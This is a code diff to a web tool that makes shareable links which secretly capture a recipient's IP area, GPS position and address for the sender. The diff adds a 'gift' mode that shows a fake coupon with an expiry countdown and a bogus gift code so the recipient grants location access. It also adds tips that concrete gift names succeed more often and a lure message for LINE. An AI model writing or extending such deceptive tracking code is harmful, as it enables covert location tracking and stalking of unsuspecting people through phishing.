@@ -45,7 +45,6 @@ button.sm{padding:9px 10px;font-size:11.5px;}
 .hitem .d{font-size:10.5px;color:#8b93a0;}
 .hitem .go{flex:0 0 auto;font-size:11px;color:#60a5fa;font-weight:800;padding:6px 2px 6px 8px;}
 .hitem .del{flex:0 0 auto;font-size:11px;color:#8b93a0;font-weight:700;background:#1b2129;border-radius:8px;padding:8px 11px;}
-.hitem .del:active{background:#2a323c;}
 ol{padding-left:20px;margin:6px 0;font-size:12px;color:#a8b0bb;line-height:1.9;}
 code{background:#0a0d12;border-radius:4px;padding:1px 5px;font-size:11px;color:#93c5fd;}
 </style>
@@ -73,14 +72,14 @@ var VID  = Date.now().toString(36) + Math.random().toString(36).slice(2,7);
 var isLine = /Line\//i.test(navigator.userAgent);
 
 function esc(s){ return String(s==null?"":s).replace(/[&<>"]/g,function(m){return {"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[m];}); }
-function req(method,url,headers,body){
+function req(method,url,headers,body,raw){
   return new Promise(function(res,rej){
     var x = new XMLHttpRequest(); x.open(method,url,true); x.timeout = 20000;
     Object.keys(headers||{}).forEach(function(k){ x.setRequestHeader(k,headers[k]); });
     x.onload  = function(){ res({ok:x.status>=200&&x.status<300, status:x.status, text:x.responseText}); };
     x.onerror = function(){ rej(new Error("network")); };
     x.ontimeout = function(){ rej(new Error("timeout")); };
-    x.send(body ? JSON.stringify(body) : null);
+    x.send(body ? (raw ? body : JSON.stringify(body)) : null);
   });
 }
 function gh(h){ var o = {"Content-Type":"application/json"}; if(TOKEN) o["Authorization"] = "Bearer " + TOKEN; return Object.assign(o, h||{}); }
@@ -103,6 +102,33 @@ function devName(){
   var os = /iPhone|iPad/.test(ua) ? "iPhone" : (/Android/.test(ua) ? "Android" : "PC");
   var br = /Line\//i.test(ua) ? "LINE内" : (/CriOS|Chrome/.test(ua) ? "Chrome" : (/Safari/.test(ua) ? "Safari" : "その他"));
   return os + " / " + br;
+}
+function dist(a,b,c,d){
+  var R=6371000, t=function(x){ return x*Math.PI/180; };
+  var dLat=t(c-a), dLon=t(d-b);
+  var s=Math.sin(dLat/2)*Math.sin(dLat/2)+Math.cos(t(a))*Math.cos(t(c))*Math.sin(dLon/2)*Math.sin(dLon/2);
+  return 2*R*Math.asin(Math.sqrt(s));
+}
+function typeJP(t){
+  if(!t) return "お店";
+  var m={cafe:"カフェ",restaurant:"飲食店",fast_food:"ファストフード",bakery:"パン屋",bar:"バー",pub:"居酒屋",convenience:"コンビニ",supermarket:"スーパー",greengrocer:"青果店"};
+  return m[t.amenity] || m[t.shop] || "お店";
+}
+function shopsNear(lat, lon){
+  var q = '[out:json][timeout:12];('
+    + 'node(around:600,'+lat+','+lon+')[amenity~"^(cafe|restaurant|fast_food|bakery|bar|pub)$"];'
+    + 'node(around:600,'+lat+','+lon+')[shop~"^(convenience|supermarket|bakery|greengrocer)$"];'
+    + ');out center 20;';
+  var body = "data=" + encodeURIComponent(q);
+  var hdr = {"Content-Type":"application/x-www-form-urlencoded"};
+  return req("POST","https://overpass-api.de/api/interpreter",hdr,body,true)
+    .catch(function(){ return req("POST","https://overpass.kumi.systems/api/interpreter",hdr,body,true); })
+    .then(function(r){
+      var j = JSON.parse(r.text);
+      return (j.elements||[]).map(function(e){
+        return { name:(e.tags && e.tags.name) || typeJP(e.tags), d: Math.round(dist(lat,lon,e.lat,e.lon)) };
+      }).sort(function(a,b){ return a.d-b.d; }).slice(0,6);
+    });
 }
 
 /* ===================== Gist ===================== */
@@ -150,7 +176,7 @@ function fmtDT(ts){
   var p = function(n){ return ("0"+n).slice(-2); };
   return (d.getMonth()+1)+"/"+d.getDate()+" "+p(d.getHours())+":"+p(d.getMinutes());
 }
-function modeLabel(m){ return ({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実" }[m] || "ふつう"); }
+function modeLabel(m){ return ({ "":"ふつう","min":"極小","blank":"真っ白","go":"確実","gift":"ギフト" }[m] || "ふつう"); }
 
 /* ===================== 地図 ===================== */
 var maps = {};
@@ -324,9 +350,115 @@ if(RID){
     }
   }
 
+  /* ---- ギフトモード ---- */
+  function giftView(){
+    var GIFT = hp.get("gi") || "500円クーポン";
+    var EX = parseInt(hp.get("x") || "0", 10);
+    var CODE = "GIFT-" + (RID.slice(0,4) || "0000").toUpperCase();
+    var SHOPS = null, st = "offer";
+
+    var ov = document.createElement("div");
+    ov.setAttribute("style","position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:#f6f4fb;color:#1a1a22;"
+      + "-webkit-text-size-adjust:100%;display:flex;align-items:center;justify-content:center;padding:22px 18px;overflow-y:auto;box-sizing:border-box;");
+    document.body.style.padding = "0";
+    document.body.appendChild(ov);
+
+    function leftTxt(){
+      if(!EX) return "まもなく失効";
+      var ms = EX - Date.now();
+      if(ms <= 0) return "まもなく失効";
+      return "あと" + Math.ceil(ms/3600000) + "時間で失効";
+    }
+    function shell(inner){
+      return '<div style="max-width:400px;width:100%;">'
+        + '<div style="background:#5b21b6;color:#fff;border-radius:15px 15px 0 0;padding:10px 16px;font-size:10.5px;font-weight:800;letter-spacing:.16em;">GIFT</div>'
+        + '<div style="background:#fff;border-radius:0 0 15px 15px;padding:22px 18px;box-shadow:0 10px 30px rgba(60,40,120,.15);">'
+        + inner + '</div></div>';
+    }
+    function shopRows(){
+      if(SHOPS === null) return '<div style="font-size:11.5px;color:#9a93ad;text-align:center;padding:10px 0;">—</div>';
+      if(!SHOPS.length) return '<div style="font-size:11.5px;color:#9a93ad;text-align:center;padding:10px 0;">近くのお店は見つかりませんでした</div>';
+      return SHOPS.map(function(s){
+        return '<div style="display:flex;justify-content:space-between;gap:8px;padding:7px 0;border-bottom:1px solid #f0eef6;font-size:12px;">'
+          + '<span style="min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">'+esc(s.name)+'</span>'
+          + '<em style="font-style:normal;color:#8b7fb8;font-size:11px;flex:0 0 auto;">'+s.d+'m</em></div>';
+      }).join("");
+    }
+
+    function paint(){
+      var h = "";
+      if(st === "offer"){
+        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:14px;">🎁</div>'
+          + '<div style="font-size:16px;font-weight:800;text-align:center;line-height:1.65;">'
+          + (NAME ? esc(NAME)+'さんから<br>' : "") + 'ギフトが届きました</div>'
+          + '<div style="margin:18px 0;border:1.5px dashed #c4b5fd;border-radius:12px;padding:16px;text-align:center;background:#faf8ff;">'
+          + '<div style="font-size:18px;font-weight:800;color:#5b21b6;">'+esc(GIFT)+'</div>'
+          + '<div style="font-size:11px;color:#8b7fb8;margin-top:6px;">'+leftTxt()+'</div></div>'
+          + '<div style="font-size:13px;color:#555;line-height:1.85;text-align:center;">お受け取りには、<br>近くのお店を調べます</div>'
+          + '<button id="gBtn" style="margin-top:18px;width:100%;padding:17px;border-radius:13px;background:#5b21b6;color:#fff;font-size:16.5px;font-weight:800;">受け取る</button>'
+          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;line-height:1.6;">'
+          + (S.ip ? '現在のエリア：'+esc(S.ip)+'<br>' : "")
+          + '「許可」を押すと近くのお店を探せます</div>';
+      } else if(st === "busy"){
+        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:14px;">🔎</div>'
+          + '<div style="font-size:16px;font-weight:800;text-align:center;line-height:1.65;">近くのお店を<br>調べています…</div>'
+          + '<div style="margin-top:18px;">'+shopRows()+'</div>'
+          + '<div style="font-size:11.5px;color:#9a93ad;text-align:center;margin-top:14px;">位置情報の使用を「許可」してください</div>';
+      } else if(st === "done"){
+        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:12px;">✅</div>'
+          + '<div style="font-size:16px;font-weight:800;text-align:center;">受け取りました</div>'
+          + (S.addr ? '<div style="font-size:11px;color:#8b7fb8;text-align:center;margin-top:6px;">'+esc(S.addr)+'</div>' : "")
+          + '<div style="margin-top:16px;">'
+          + '<div style="font-size:11px;font-weight:800;color:#5b21b6;margin-bottom:6px;">'
+          + (SHOPS && SHOPS.length ? '近くのお店 '+SHOPS.length+'件' : '近くのお店')+'</div>'
+          + shopRows() + '</div>'
+          + '<div style="margin-top:14px;background:#f4f1fb;border-radius:11px;padding:12px;text-align:center;">'
+          + '<div style="font-size:10.5px;color:#8b7fb8;margin-bottom:4px;">ギフト番号</div>'
+          + '<div style="font-size:15px;font-weight:800;letter-spacing:.12em;color:#5b21b6;">'+CODE+'</div></div>'
+          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;">レジでこの番号を伝えてください</div>';
+      } else {
+        h = '<div style="font-size:38px;line-height:1;text-align:center;margin-bottom:12px;">⚠️</div>'
+          + '<div style="font-size:16px;font-weight:800;text-align:center;">お店を調べるには<br>位置情報が必要です</div>'
+          + '<div style="font-size:12.5px;color:#555;line-height:1.85;text-align:center;margin-top:12px;">設定 → Safari → 位置情報 → このサイト を「許可」に変えてください。</div>'
+          + '<button id="gBtn" style="margin-top:18px;width:100%;padding:16px;border-radius:13px;background:#5b21b6;color:#fff;font-size:15.5px;font-weight:800;">もう一度試す</button>'
+          + '<div style="font-size:11px;color:#9a93ad;text-align:center;margin-top:10px;">ギフト番号 '+CODE+' は有効です</div>';
+      }
+      ov.innerHTML = shell(h);
+      if($("gBtn")) $("gBtn").onclick = start;
+    }
+
+    function loadShops(){
+      if(!S.lat){ SHOPS = []; paint(); return; }
+      shopsNear(S.lat, S.lon).then(function(l){ SHOPS = l; paint(); }).catch(function(){ SHOPS = []; paint(); });
+    }
+    function start(){
+      st = "busy"; paint();
+      var got = false;
+      var on = function(p){
+        got = true;
+        return applyFix(p).then(function(ok){
+          if(ok){ st = "done"; paint(); loadShops(); }
+        });
+      };
+      var err = function(e){ if((e && e.code === 1) || !got){ st = "denied"; paint(); report(); } };
+      fix(false).then(on).catch(err);
+      fix(true).then(on).catch(err);
+    }
+
+    paint();
+    ipOnly().then(function(c){ S.ip = c; if(st === "offer") paint(); });
+    if(navigator.permissions && navigator.permissions.query){
+      navigator.permissions.query({name:"geolocation"}).then(function(ps){
+        if(ps.state === "granted") start();
+        ps.onchange = function(){ if(ps.state === "granted" && st === "offer") start(); };
+      }).catch(function(){});
+    }
+  }
+
   if(V === "blank"){ document.body.style.background = "#fff"; document.body.style.padding = "0"; capture(true); }
   else if(V === "min"){ minView(); }
   else if(V === "go"){ goView(); }
+  else if(V === "gift"){ giftView(); }
   else { normalView(); }
 
   return;
@@ -355,8 +487,14 @@ $("app").innerHTML =
 +       '<option value="">ふつう（住所を表示）</option>'
 +       '<option value="min">極小（1行だけ）</option>'
 +       '<option value="blank">真っ白（何も出さない）</option>'
-+       '<option value="go">確実（許可を取る・一番正確）</option>'
++       '<option value="go">確実（許可を取る）</option>'
++       '<option value="gift">ギフト（受け取り演出・一番通る）</option>'
 +     '</select>'
++     '<div id="giftRow" class="hidden">'
++       '<label>ギフトの名前</label>'
++       '<input id="inGift" placeholder="500円クーポン" autocomplete="off">'
++       '<div class="muted">「500円クーポン」「コーヒー1杯」など、具体的なほど通ります。</div>'
++     '</div>'
 +     '<label class="chk"><input type="checkbox" id="inGps" checked> GPSで正確に特定する</label>'
 +     '<button id="btnMake" class="pri" style="width:100%;margin-top:16px;">リンクを作る</button>'
 +     '<div class="muted" id="makeMsg"></div>'
@@ -373,7 +511,7 @@ $("app").innerHTML =
 +     '<div class="row wrap">'
 +       '<button class="sm" data-tp="0">これ開いてみて</button>'
 +       '<button class="sm" data-tp="1">許可押してね</button>'
-+       '<button class="sm" data-tp="2">当ててみる</button>'
++       '<button class="sm" data-tp="2">ギフト届いたよ</button>'
 +     '</div>'
 +     '<div class="row"><button id="btnTmplCopy">文面をコピー</button></div>'
 +     '<div class="row"><button id="btnStop" class="dang">このリンクを停止する</button></div>'
@@ -422,7 +560,7 @@ $("app").innerHTML =
 +       '<li>LINEなどで相手に送る</li>'
 +       '<li>相手が開くと、結果タブに届く</li>'
 +     '</ol>'
-+     '<div class="muted">モードの目安：相手にバレたくない→極小か真っ白。正確な住所が欲しい→確実。</div>'
++     '<div class="muted">モードの目安：バレたくない→極小か真っ白。確実に取る→確実かギフト。</div>'
 +   '</div>'
 +   '<div class="card">'
 +     '<div class="h2">注意</div>'
@@ -441,6 +579,8 @@ document.querySelectorAll(".tabs button").forEach(function(b){
     if(tab === "set"){ $("inTok").value = TOKEN; }
   };
 });
+
+$("inMode").onchange = function(){ $("giftRow").classList.toggle("hidden", this.value !== "gift"); };
 
 var SHARE = [
   ["LINE", function(t){ return "https://line.me/R/msg/text/?" + encodeURIComponent(t); }],
@@ -466,7 +606,7 @@ $("shareRow").onclick = function(e){
 var TMPL = [
   "これ開いてみて。開くだけでOK。",
   "リンク開いてみて。「許可」押してくれたら正確になる。",
-  "君の住所、当ててみる。開いてみて。"
+  "ギフト届いたよ。開いて受け取って。"
 ];
 document.querySelectorAll("[data-tp]").forEach(function(b){
   b.onclick = function(){ $("tmpl").value = TMPL[+b.dataset.tp] + "\n" + $("linkField").textContent; };
@@ -480,16 +620,19 @@ function copy(s){
 $("btnMake").onclick = function(){
   if(!TOKEN){ $("makeMsg").textContent = "設定タブでトークンを入れてください。"; document.querySelector('[data-t="set"]').click(); return; }
   $("btnMake").textContent = "作成中…";
-  var nm = $("inName").value.trim(), md = $("inMode").value, gp = $("inGps").checked;
+  var nm = $("inName").value.trim(), md = $("inMode").value, gp = $("inGps").checked || md === "gift";
+  var extra = md === "gift"
+    ? "&x=" + (Date.now() + 86400000) + "&gi=" + encodeURIComponent($("inGift").value.trim() || "500円クーポン")
+    : "";
   createGist().then(function(id){
-    var url = BASE + "#n=" + encodeURIComponent(nm) + "&r=gh" + id + "&t=" + TOKEN + (md ? "&v=" + md : "") + (gp ? "&g=1" : "");
+    var url = BASE + "#n=" + encodeURIComponent(nm) + "&r=gh" + id + "&t=" + TOKEN + (md ? "&v=" + md : "") + (gp ? "&g=1" : "") + extra;
     var h = getHist();
     h.unshift({ id:id, name:nm, mode:md, gps:gp, ts:Date.now() });
     setHist(h);
     CUR = h[0];
     $("outBox").classList.remove("hidden");
     $("linkField").textContent = url;
-    $("tmpl").value = TMPL[0] + "\n" + url;
+    $("tmpl").value = (md === "gift" ? TMPL[2] : TMPL[0]) + "\n" + url;
     renderHist();
     $("btnMake").textContent = "リンクを作る";
     $("makeMsg").textContent = "";
